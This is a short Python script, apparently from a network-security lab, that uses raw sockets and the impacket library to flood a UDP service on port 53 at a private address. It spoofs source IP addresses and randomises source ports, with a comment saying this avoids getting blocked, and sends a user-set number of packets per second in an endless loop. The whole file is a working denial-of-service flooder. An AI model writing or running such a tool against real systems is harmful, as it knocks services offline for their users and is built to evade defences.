import socket
from random import randint
import time
# learn ImpactPacket library which is used to manually make your own custom packets
from impacket import ImpactPacket 
import sys

SERVER_ADDR = "10.0.0.100"
PORT = 53
PAYLOAD = 32
# give power as an argument
power = int(sys.argv[1])

adversarySocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
adversarySocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
message = 'A' * PAYLOAD

# create an IP packet
ip = ImpactPacket.IP()
ip.set_ip_dst(SERVER_ADDR)

# create a UDP datagram
udp = ImpactPacket.UDP()
udp.set_uh_dport(PORT)
# put some data in it
udp.contains(ImpactPacket.Data(message))
# put the UDP into the IP packet
ip.contains(udp)


while (True):
	# here power is used to tell how many packets to bombard in a second
	for i in range(power):
		# use a random port, to prevent getting blocked
		i = randint(50000, 60000)
		udp.set_uh_sport(i)
		# put a random ip address as the source ip of the packet
		ip.set_ip_src('10.0.0.' + str(randint(1, 5)))
		adversarySocket.sendto(ip.get_packet(), (SERVER_ADDR, PORT))
	time.sleep(1)
